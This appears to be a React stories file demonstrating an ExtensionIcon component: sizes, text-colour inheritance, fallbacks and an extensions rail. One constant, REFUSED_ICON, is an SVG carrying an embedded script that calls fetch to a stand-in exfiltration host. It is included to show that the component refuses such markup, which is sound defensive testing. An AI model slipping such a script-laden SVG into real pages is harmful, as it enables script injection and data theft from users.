import { Card, ExtensionIcon, Mono } from '@solus/desktop'

const BOM_ICON =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="9" x2="9" y2="21"/></svg>'

const TELEMETRY_ICON =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="2 13 6 13 9 4 15 20 18 13 22 13"/></svg>'

const BOARD_ICON =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6" rx="1"/><line x1="9" y1="2" x2="9" y2="4"/><line x1="15" y1="2" x2="15" y2="4"/><line x1="2" y1="9" x2="4" y2="9"/><line x1="20" y1="15" x2="22" y2="15"/></svg>'

/** A manifest icon the reducer refuses: script markup never reaches the DOM. */
const REFUSED_ICON =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>fetch("https://exfil.example")</script><circle cx="12" cy="12" r="9"/></svg>'

function Sample({ label, children }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
      <div
        style={{
          width: 44,
          height: 44,
          borderRadius: 4,
          border: '1px solid var(--bd)',
          background: 'var(--sur)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center'
        }}
      >
        {children}
      </div>
      <Mono size={9}>{label}</Mono>
    </div>
  )
}

export function Sizes() {
  return (
    <div style={{ display: 'flex', gap: 14, color: 'var(--tx)' }}>
      <Sample label="14px">
        <ExtensionIcon svg={BOM_ICON} size={14} label="BOM" />
      </Sample>
      <Sample label="16px">
        <ExtensionIcon svg={BOM_ICON} size={16} label="BOM" />
      </Sample>
      <Sample label="24px">
        <ExtensionIcon svg={BOM_ICON} size={24} label="BOM" />
      </Sample>
      <Sample label="32px">
        <ExtensionIcon svg={BOM_ICON} size={32} label="BOM" />
      </Sample>
    </div>
  )
}

export function FollowsTextColor() {
  return (
    <div style={{ display: 'flex', gap: 14 }}>
      <div style={{ color: 'var(--mut)' }}>
        <Sample label="rail idle">
          <ExtensionIcon svg={TELEMETRY_ICON} size={24} label="Telemetry Dashboard" />
        </Sample>
      </div>
      <div style={{ color: 'var(--tx)' }}>
        <Sample label="rail active">
          <ExtensionIcon svg={TELEMETRY_ICON} size={24} label="Telemetry Dashboard" />
        </Sample>
      </div>
      <div style={{ color: 'var(--acc)' }}>
        <Sample label="update ready">
          <ExtensionIcon svg={BOARD_ICON} size={24} label="KiCad Viewer" />
        </Sample>
      </div>
    </div>
  )
}

export function Fallbacks() {
  return (
    <div style={{ display: 'flex', gap: 14, color: 'var(--tx)' }}>
      <Sample label="no icon">
        <ExtensionIcon svg={null} size={24} />
      </Sample>
      <Sample label="refused svg">
        <ExtensionIcon svg={REFUSED_ICON} size={24} />
      </Sample>
      <Sample label="accepted">
        <ExtensionIcon svg={BOARD_ICON} size={24} label="KiCad Viewer" />
      </Sample>
    </div>
  )
}

export function InRail() {
  return (
    <Card style={{ width: 260, display: 'flex', flexDirection: 'column', gap: 12 }}>
      <Mono size={9.5} ls="0.18em">
        Extensions
      </Mono>
      {[
        { svg: BOM_ICON, name: 'BOM' },
        { svg: BOARD_ICON, name: 'KiCad Viewer' },
        { svg: TELEMETRY_ICON, name: 'Telemetry Dashboard' },
        { svg: null, name: 'Harness Router' }
      ].map((row) => (
        <div
          key={row.name}
          style={{ display: 'flex', alignItems: 'center', gap: 10, color: 'var(--tx)' }}
        >
          <ExtensionIcon svg={row.svg} size={16} label={row.name} />
          <span style={{ fontSize: 13 }}>{row.name}</span>
        </div>
      ))}
    </Card>
  )
}
